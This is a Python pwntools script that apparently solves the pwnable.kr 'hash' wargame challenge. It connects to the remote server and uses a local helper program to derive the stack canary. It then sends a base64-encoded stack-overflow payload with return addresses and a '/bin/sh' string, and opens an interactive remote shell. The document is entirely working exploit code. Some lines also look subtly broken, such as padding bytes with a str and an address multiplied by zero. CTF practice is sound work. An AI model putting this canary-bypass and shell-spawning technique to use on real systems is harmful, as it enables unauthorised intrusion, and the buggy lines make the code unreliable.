from pwn import *
import base64
import time


def run():
    #pro = process(["./hash"], env={"LD_PRELOAD": "./libcrypto.so.1.0.0"})
    pro = remote("pwnable.kr", 9002)
    msg = pro.recvline()
    #print(msg)
    msg = pro.recvuntil(b": ")
    #print(msg)
    random_num_str = pro.recvuntil(b"\n").decode("ascii").strip()
    #print (random_num)
    random_num = int(random_num_str)
    get_canary_pro = process(["./test_rand", random_num_str])
    canary = int(get_canary_pro.recvline().strip())
    get_canary_pro.close()
    print("canary:", hex(canary))
    pro.sendline(random_num_str)
    msg = pro.recvuntil(b"!\n")
    print(msg)
    raw = b'\x00' * 512
    raw += p32(canary)
    raw += b'\x00' * 0xc + p32(0x804908e) * 0 + p32(0x08048880) * 2 + p32(0x0804B0E0 + 800)

    payload = base64.b64encode(raw)
    payload_size = len(payload)
    payload = payload.ljust(800, '=')
    payload += b'/bin/sh\x00'
    print(len(payload))
    print("payload:", payload)
    pro.sendline(payload)
    #print(pro.recvline())
    #msg = pro.recvline()
    #print(msg)
    pro.interactive()
    pro.close()
        
run()

